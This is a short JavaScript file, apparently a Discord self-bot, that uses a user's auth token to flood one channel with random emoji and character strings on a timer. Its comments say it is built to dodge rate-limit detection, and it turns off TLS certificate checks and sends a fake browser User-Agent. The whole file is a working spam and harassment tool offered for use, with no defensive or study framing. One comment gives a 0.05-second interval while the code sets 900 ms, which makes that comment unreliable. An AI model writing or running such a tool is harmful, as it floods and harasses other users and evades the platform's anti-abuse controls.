const axios = require("axios");
const https = require("https");

// ㊙️ PR0XY BYPASS CONFIG (AVOID RATE LIMIT DETECTION)
const agent = new https.Agent({
  rejectUnauthorized: false,
  keepAlive: true,
  timeout: 3000,
});

const USER_TOKEN =
  token; // Replace with mtd.cookies.get('token')
const CHANNEL_ID = "1371915549155790922"; // From devtools > network > messages

// 🎲 RANDOM MESSAGE GENERATOR (UNICODE + EMOJI SPAM)
const generateCancer = () => {
  const emojis = ["😈", "💣", "💥", "🔫", "☠️", "☺️", "🐒"];
  const chars =
    "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789";
  return (
    Array.from({ length: Math.floor(Math.random() * 50) + 10 }, () =>
      Math.random() < 0.5
        ? chars[Math.floor(Math.random() * chars.length)]
        : emojis[Math.floor(Math.random() * emojis.length)],
    ).join("") + ` [${Date.now()}]`
  );
};

// 💣 MASS MESSAGE BOMBER (0.05s NUKING INTERVAL)
const nukeChannel = async () => {
  let counter = 0;
  const interval = setInterval(async () => {
    try {
      await axios.post(
        `https://discord.com/api/v9/channels/${CHANNEL_ID}/messages`,
        { content: generateCancer(), tts: false },
        {
          headers: {
            Authorization: USER_TOKEN,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "X-Super-Properties": "BASE64_ENCODED_TRACKING_DATA",
          },
          httpsAgent: agent,
        },
      );
      console.log(
        `[💀] MESSAGE ${++counter} SENT @ ${new Date().toISOString()}`,
      );
    } catch (e) {
      console.log(`[🔥] ERROR: ${e.response?.data || e.message}`);
    }
  }, 900);
};

nukeChannel();
